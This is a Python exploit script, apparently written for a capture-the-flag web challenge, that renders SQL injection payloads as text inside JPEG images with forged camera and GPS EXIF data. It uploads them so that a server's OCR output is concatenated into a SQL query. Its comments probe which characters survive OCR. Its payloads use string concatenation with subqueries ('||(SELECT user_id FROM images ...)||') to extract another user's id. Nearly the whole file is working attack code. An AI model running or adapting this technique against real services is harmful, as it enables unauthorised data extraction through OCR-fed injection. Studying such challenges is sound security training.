# v2_seechar.py — plain 'SELECT user_id FROM images WHERE id equals 1' read fine (200). The
# executable one (with = and quotes/||) 500s. Find WHICH char breaks it by reading each as plain
# text and seeing the OCR output. Test: user_id underscore, '=', digit after =, and the wrapper.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=30):
    W=min(2000,max(1000,40+int(len(text)*size*0.56))); H=260
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("sc.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"sc.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("sc.jpg","rb").read()).decode()

def up(painted, desc):
    CNT[0]+=1
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
    print(f"{desc:18} {r.status_code} ocr={ocr!r}")
    return r.status_code, ocr

sq="'"
print("=== plain text: how does OCR read each critical piece? ===")
up("SELECT user_id FROM images WHERE id=1", "plain_eq")           # the real query as PLAIN text
up("id=1 id=2 id=3", "eq_reads")                                  # how is '=' read?
up("user_id user_id", "underscore")                              # underscore ok?
print()
print("=== executable, replacing '=' with alternatives OCR reads well ===")
# SQLite: 'id IS 1' instead of 'id=1' (avoids '=')
up("9"+sq+"||(SELECT user_id FROM images WHERE id IS 1)||"+sq+"9", "is_1")
# 'WHERE id IN(1)'
up("9"+sq+"||(SELECT user_id FROM images WHERE id IN(1))||"+sq+"9", "in_1")
# no WHERE at all, just LIMIT to get row 1
up("9"+sq+"||(SELECT user_id FROM images LIMIT 1)||"+sq+"9", "limit_only")
